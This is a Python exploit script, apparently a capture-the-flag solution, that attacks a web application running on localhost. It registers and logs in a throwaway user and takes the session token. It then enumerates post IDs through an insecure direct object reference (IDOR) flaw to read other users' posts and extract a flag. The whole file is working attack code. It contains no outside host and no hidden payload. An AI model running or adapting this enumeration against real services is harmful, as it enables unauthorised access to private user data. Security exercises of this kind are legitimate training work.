import requests
import random
import string

def generate_random_string(length=10):
    """Generate a random string of fixed length."""
    letters = string.ascii_lowercase
    return "".join(random.choice(letters) for i in range(length))

def main():
    """
    Main function to execute the exploit.
    """
    base_url = "http://localhost:8080"
    s = requests.Session()

    # 1. Register a new user
    username = generate_random_string()
    email = f"{username}@example.com"
    password = generate_random_string()
    
    register_payload = {
        "username": username,
        "email": email,
        "password": password
    }
    
    try:
        print(f"[*] Registering user: {username}")
        register_response = s.post(f"{base_url}/api/auth/register", json=register_payload, timeout=5)
        register_response.raise_for_status()
        print("[+] Registration successful.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Registration failed: {e}")
        return

    # 2. Log in with the new user
    login_payload = {
        "username": username,
        "password": password
    }
    
    try:
        print(f"[*] Logging in as user: {username}")
        login_response = s.post(f"{base_url}/api/auth/login", json=login_payload, timeout=5)
        login_response.raise_for_status()
        token = login_response.json().get("token")
        if not token:
            print("[-] Failed to get JWT token from login response.")
            return
        print("[+] Login successful, obtained JWT token.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Login failed: {e}")
        return

    # 3. & 4. Iterate through post IDs to find the flag
    s.headers.update({"Authorization": f"Bearer {token}"})
    
    print("[*] Starting IDOR attack on /api/posts/{id}")
    for post_id in range(1, 21): # Iterate through a reasonable range of IDs
        try:
            print(f"[*] Trying post ID: {post_id}")
            post_url = f"{base_url}/api/posts/{post_id}"
            response = s.get(post_url, timeout=5)
            
            if response.status_code == 200:
                post_data = response.json()
                content = post_data.get("content", "")
                
                # 5. & 6. Check for the flag in the post content
                if "ev" in content:
                    print(f"[+] Found potential flag in post {post_id}!")
                    print(f"[*] Flag: {content}")
                    return
        except requests.exceptions.RequestException as e:
            print(f"[-] An error occurred while fetching post {post_id}: {e}")
            continue
        except ValueError: # Catches JSON decoding errors
            print(f"[-] Failed to decode JSON for post {post_id}.")
            continue
            
    print("[-] Exploit finished. Flag not found.")

if __name__ == "__main__":
    main()